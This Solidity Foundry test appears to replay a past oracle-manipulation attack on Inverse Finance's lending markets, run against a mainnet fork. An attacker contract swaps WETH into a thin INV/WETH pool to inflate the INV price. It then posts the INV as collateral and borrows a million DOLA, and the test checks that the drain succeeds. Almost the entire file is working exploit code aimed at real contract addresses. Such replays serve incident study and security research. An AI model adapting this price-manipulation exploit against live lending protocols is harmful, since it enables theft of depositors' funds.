// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface ICompoundMarket {
    function mint(uint256 amount) external returns (uint256);
    function borrow(uint256 amount) external returns (uint256);
}

interface IInverseComptroller {
    function enterMarkets(
        address[] calldata markets
    ) external returns (uint256[] memory);
}

interface ISyncPair {
    function sync() external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract InverseFrontierAttacker {
    IERC20 private constant INV = IERC20(0x41D5D79431A913C4aE7d69a668ecdfE5fF9DFB68);
    IERC20 private constant WETH_TOKEN = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant DOLA = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);
    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 private constant YFI = IERC20(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e);

    ISyncPair private constant INV_WETH_PAIR = ISyncPair(0x328dFd0139e26cB0FEF7B0742B49b0fe4325F821);
    IInverseComptroller private constant COMPTROLLER =
        IInverseComptroller(0x4dCf7407AE5C07f8681e1659f626E114A7667339);
    ICompoundMarket private constant AN_INV = ICompoundMarket(0x1637e4e9941D55703a7A5E7807d6aDA3f7DCD61B);
    ICompoundMarket private constant AN_DOLA = ICompoundMarket(0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670);
    ICompoundMarket private constant AN_ETH = ICompoundMarket(0x697b4acAa24430F254224eB794d2a85ba1Fa1FB8);
    ICompoundMarket private constant AN_WBTC = ICompoundMarket(0x17786f3813E6bA35343211bd8Fe18EC4de14F28b);
    ICompoundMarket private constant AN_YFI = ICompoundMarket(0xde2af899040536884e062D3a334F2dD36F34b4a4);

    function manipulatePrice() external {
        (uint112 invReserve, uint112 wethReserve,) = INV_WETH_PAIR.getReserves();
        uint256 wethIn = WETH_TOKEN.balanceOf(address(this));
        uint256 amountInWithFee = wethIn * 997;
        uint256 invOut = amountInWithFee * invReserve / (uint256(wethReserve) * 1000 + amountInWithFee);
        WETH_TOKEN.transfer(address(INV_WETH_PAIR), wethIn);
        INV_WETH_PAIR.swap(invOut, 0, address(this), "");
    }

    function drain() external {
        INV_WETH_PAIR.sync();
        uint256 invBalance = INV.balanceOf(address(this));
        INV.approve(address(AN_INV), invBalance);
        require(AN_INV.mint(invBalance) == 0, "mint failed");

        address[] memory markets = new address[](1);
        markets[0] = address(AN_INV);
        COMPTROLLER.enterMarkets(markets);

        require(AN_DOLA.borrow(1_000_000 ether) == 0, "DOLA borrow failed");
    }

    receive() external payable {}
}

contract InverseFinanceFrontierExploitTest is Test {
    IERC20 private constant INV = IERC20(0x41D5D79431A913C4aE7d69a668ecdfE5fF9DFB68);
    IERC20 private constant WETH_TOKEN = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant DOLA = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);
    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    function testExploit() public {
        // The attacker had already spent its own capital manipulating the low-liquidity
        // INV/WETH TWAP. This is the block immediately before the draining transaction.
        vm.createSelectFork("https://eth.drpc.org", 14_506_358);

        InverseFrontierAttacker attacker = new InverseFrontierAttacker();
        deal(address(WETH_TOKEN), address(attacker), 500 ether);

        attacker.manipulatePrice();
        vm.warp(block.timestamp + 30 minutes);
        vm.roll(block.number + 150);
        attacker.drain();

        assertGt(DOLA.balanceOf(address(attacker)), 999_000 ether);
    }
}
